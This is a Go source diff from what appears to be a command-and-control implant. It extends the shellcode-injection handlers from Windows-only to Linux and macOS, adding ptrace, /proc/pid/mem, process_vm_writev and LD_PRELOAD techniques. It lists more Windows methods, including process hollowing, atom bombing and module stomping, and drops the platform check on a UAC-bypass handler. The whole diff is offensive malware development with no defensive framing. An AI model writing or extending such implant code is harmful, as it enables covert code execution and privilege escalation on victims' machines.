@@ -29,7 +29,8 @@ func handleInject(task Task, res *TaskResult) {
 }
 
 func handleInjectMethods(task Task, res *TaskResult) {
-	res.Output = `Available injection methods:
+	if runtime.GOOS == "windows" {
+		res.Output = `Available injection methods (Windows):
   createremotethread (crt, remote) - CreateRemoteThread (kernel32)
   ntcreatethreadex (ntct, nt) - NtCreateThreadEx (direct syscall)
   ntcreatethreadex_indirect (ntcti, nti) - NtCreateThreadEx (indirect syscall)
@@ -37,7 +38,25 @@ func handleInjectMethods(task Task, res *TaskResult) {
   earlybird - CreateProcess suspended + APC + ResumeThread
   threadless (tl) - SetThreadContext RIP overwrite (no new thread)
   syscall (hellsgate, direct) - Hell's Gate direct syscall + CreateRemoteThread
-  indirect - Indirect syscall through ntdll gadget + NtCreateThreadEx`
+  indirect - Indirect syscall through ntdll gadget + NtCreateThreadEx
+  hollow - Process hollowing (suspend + unmap + write + resume)
+  hijack - Thread hijacking (suspend + set RIP + resume)
+  atom - Atom bombing (section + global atom + APC)
+  txf - Transacted hollowing (TxF file + CreateProcess)
+  stomp - Module stomping (overwrite module code + remote thread)`
+	} else if runtime.GOOS == "linux" {
+		res.Output = `Available injection methods (Linux):
+  ptrace (ptrace_pokedata) - Ptrace POKEDATA injection into remote process
+  mem (proc_mem) - Write to /proc/pid/mem for process injection
+  process_vm_writev (vm_writev) - process_vm_writev syscall injection
+  ld_preload - LD_PRELOAD-based injection into spawned process`
+	} else if runtime.GOOS == "darwin" {
+		res.Output = `Available injection methods (macOS):
+  ptrace (pt_attachexc) - Ptrace-based injection (requires SIP disabled or entitlement)
+  task_for_pid (mach_vm) - Mach VM injection (requires root/entitlement)`
+	} else {
+		res.Output = "No injection methods available for this platform"
+	}
 }
 
 func handleSpawn(task Task, res *TaskResult) {
@@ -79,9 +98,11 @@ func handleShinject(task Task, res *TaskResult) {
 		res.Error = "empty shellcode in task.Data"
 		return
 	}
-	if runtime.GOOS != "windows" {
-		res.Error = "shinject: Windows only"
-		return
+	// Platform-specific default tech
+	if runtime.GOOS == "linux" && tech == "createremotethread" {
+		tech = "ptrace"
+	} else if runtime.GOOS == "darwin" && tech == "createremotethread" {
+		tech = "ptrace"
 	}
 	err := injectProcess(uint32(pid), shellcode, tech)
 	if err != nil {
@@ -92,7 +113,18 @@ func handleShinject(task Task, res *TaskResult) {
 }
 
 func handleShspawn(task Task, res *TaskResult) {
-	targetExe := "rundll32.exe"
+	targetExe := ""
+	tech := ""
+	if runtime.GOOS == "windows" {
+		targetExe = "rundll32.exe"
+		tech = "apc"
+	} else if runtime.GOOS == "linux" {
+		targetExe = "/bin/sleep"
+		tech = "ptrace"
+	} else if runtime.GOOS == "darwin" {
+		targetExe = "/usr/bin/yes"
+		tech = "ptrace"
+	}
 	if task.Command != "" {
 		targetExe = task.Command
 	}
@@ -101,11 +133,7 @@ func handleShspawn(task Task, res *TaskResult) {
 		res.Error = "empty shellcode in task.Data"
 		return
 	}
-	if runtime.GOOS != "windows" {
-		res.Error = "shspawn: Windows only"
-		return
-	}
-	result := spawnProcess(targetExe, shellcode, "apc")
+	result := spawnProcess(targetExe, shellcode, tech)
 	res.Output = result
 }
 
@@ -134,11 +162,7 @@ func handleUACBypass(task Task, res *TaskResult) {
 	if len(parts) > 1 {
 		payload = parts[1]
 	}
-	if runtime.GOOS != "windows" {
-		res.Error = "uac_bypass is Windows-only"
-	} else {
-		res.Output = uacBypass(method, payload)
-	}
+	res.Output = uacBypass(method, payload)
 }
 
 // UAC sub-methods used by elevate()
